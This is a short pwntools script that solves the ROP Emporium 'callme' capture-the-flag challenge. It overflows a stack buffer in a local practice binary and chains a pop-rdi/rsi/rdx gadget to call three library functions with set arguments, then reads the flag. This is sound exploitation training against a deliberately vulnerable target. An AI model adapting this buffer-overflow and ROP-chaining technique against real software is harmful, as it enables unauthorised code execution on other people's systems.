# https://ropemporium.com/challenge/callme.html
from pwn import *

# there are 3 functions in the .so that will be resolved using the plt/got and we need to call them
# using a cyclic pattern we know that the rip offset is 40

context.terminal = ["gnome-terminal", "--"]
# shell = gdb.debug("./callme", "continue")
shell = process("./callme")

payload  = b"A" * 40
payload += p64(0x40093c) # 0x40093c --> pop rdi ; pop rsi ; pop rdx ; ret (this one is quite convenient)
payload += p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(0x400720) # callme_one@plt

# add the same arguments as for callme_one()
payload += p64(0x40093c)
payload += p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(0x400740) # callme_two@plt

# add the same arguments as for callme_one() and callme_two()
payload += p64(0x40093c)
payload += p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(0x4006f0) # callme_three@plt
payload += b"C" * 8

shell.sendlineafter(b"> ", payload)
shell.recvuntil(b"callme_two() called correctly\n")
flag = shell.recvline().decode().strip()
log.info(f"Flag: {flag}")
shell.close()
